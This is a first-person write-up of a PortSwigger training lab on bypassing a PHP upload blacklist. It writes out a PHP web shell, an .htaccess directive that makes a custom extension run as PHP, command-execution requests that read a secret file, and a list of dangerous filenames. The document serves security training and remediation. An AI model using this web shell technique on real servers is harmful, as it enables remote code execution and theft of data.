# PortSwigger Lab 04 - Web Shell Upload via Extension Blacklist Bypass

## Lab Source

PortSwigger Web Security Academy - File upload vulnerabilities - Lab: Web shell upload via extension blacklist bypass.

## Goal

Upload a PHP web shell and use it to read:

```text
/home/carlos/secret
```

## What I Tested

I started with a valid PNG upload to establish the baseline behaviour.

Observed behaviour:

```text
valid-image.png -> accepted
```

The application returned a message similar to:

```text
The file avatars/<filename>.png has been uploaded.
```

This confirmed that:

- the upload endpoint was `/my-account/avatar`
- the request used `multipart/form-data`
- uploaded avatar files were served from `/files/avatars/`
- normal image files were accepted

## Initial Web Shell Attempt

Payload:

```php
<?php echo system($_GET['cmd']); ?>
```

Filename:

```text
shell.php
```

Result:

```text
Sorry, php files are not allowed
Sorry, there was an error uploading your file.
```

## Initial Hypothesis

The error message specifically mentioned `php` files. This suggested an extension blacklist rather than a strict image allowlist.

The next question was not only:

```text
Can I get a file accepted?
```

It was also:

```text
Will the server execute the accepted file?
```

## Test 1 - Null Byte Style Filename

Test filename:

```text
shell.php%00.php
```

Result:

```text
not useful for this lab
```

This was the wrong branch. The previous obfuscated-extension lab depended on validation and storage interpreting a filename differently. This lab was about an incomplete blacklist and Apache directory configuration.

## Test 2 - Alternative PHP-Like Extension

Test filename:

```text
shell.php7
```

Result:

```text
upload accepted
```

Request:

```http
GET /files/avatars/shell.php7?cmd=whoami
```

Response:

```php
<?php echo system($_GET['cmd']); ?>
```

The source code was served as plain text. This proved that upload acceptance was not enough: Apache did not execute `.php7` as PHP in this environment.

## Key Observation

Two conditions were required for remote code execution:

1. the upload filter had to accept the file
2. the web server had to interpret the uploaded file as executable code

## Test 3 - Apache `.htaccess` Configuration

The response headers showed:

```http
Server: Apache/2.4.41 (Ubuntu)
```

Because the stack was Apache, `.htaccess` became relevant. If local overrides are enabled, an uploaded `.htaccess` file can change how files are handled in that directory.

Configuration file:

```apache
AddType application/x-httpd-php .l33t
```

Meaning:

```text
Treat files ending in .l33t as PHP.
```

## Mistake to Avoid

Do not put the PHP payload inside `.htaccess`.

Incorrect `.htaccess` content:

```apache
AddType application/x-httpd-php .l33t

<?php echo system($_GET['cmd']); ?>
```

Result:

```http
500 Internal Server Error
```

`.htaccess` is an Apache configuration file, not a PHP file. Apache tries to parse every line as configuration, so the PHP code causes a configuration error.

## Correct Exploit Flow

Upload `.htaccess` first:

```text
.htaccess
```

Content:

```apache
AddType application/x-httpd-php .l33t
```

Then upload the PHP payload separately:

```text
shell.l33t
```

Content:

```php
<?php echo system($_GET['cmd']); ?>
```

Test command execution:

```http
GET /files/avatars/shell.l33t?cmd=whoami
```

Observed output:

```text
carlos
carlos
```

The output was duplicated because `system()` already prints command output, and `echo` prints the return value again.

Cleaner payloads:

```php
<?php system($_GET['cmd']); ?>
```

or:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Read the secret:

```http
GET /files/avatars/shell.l33t?cmd=cat+/home/carlos/secret
```

## What I Found

```text
shell.php  -> blocked by the upload filter
shell.php7 -> uploaded, but served as static text
.htaccess  -> uploaded and changed Apache handling
shell.l33t -> uploaded and executed as PHP
```

The application blocked `.php`, but the blacklist was incomplete. It allowed `.htaccess` to be uploaded into a web-accessible avatar directory. That allowed Apache behaviour to be changed so a custom extension was executed as PHP.

## Root Cause

The root cause was a combination of:

- extension blacklist validation
- incomplete blocking of dangerous PHP-related extensions
- allowing dangerous configuration files such as `.htaccess`
- storing uploads in a web-accessible directory
- Apache local directory overrides being enabled
- server-side code execution being possible in the upload directory

## Impact

An attacker could:

- upload an Apache configuration file
- make Apache treat a custom extension as PHP
- upload a PHP web shell with that custom extension
- execute commands on the server
- read sensitive files such as `/home/carlos/secret`

This is remote code execution.

## Remediation

The application should:

- use a strict allowlist of safe file extensions
- reject `.php`, `.phtml`, `.phar`, `.php5`, `.php7`, `.pht`, `.htaccess` and other dangerous files
- generate filenames server-side instead of preserving user-controlled filenames
- store uploaded files outside the executable web root where possible
- disable code execution in upload directories
- disable or restrict `.htaccess` overrides where they are not needed
- validate file content server-side
- serve uploaded files as static content only
- add regression tests for dangerous extensions and configuration files

## Regression Test Idea

The application should reject or safely handle:

```text
shell.php
shell.php7
shell.phtml
shell.phar
shell.pht
.htaccess
shell.l33t
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
```

It should also verify that uploaded files cannot change server configuration or be executed as code.

## Main Takeaway

Do not rely on extension blacklists.

Upload testing must check both sides of the behaviour:

```text
what the application accepts
what the server executes
```
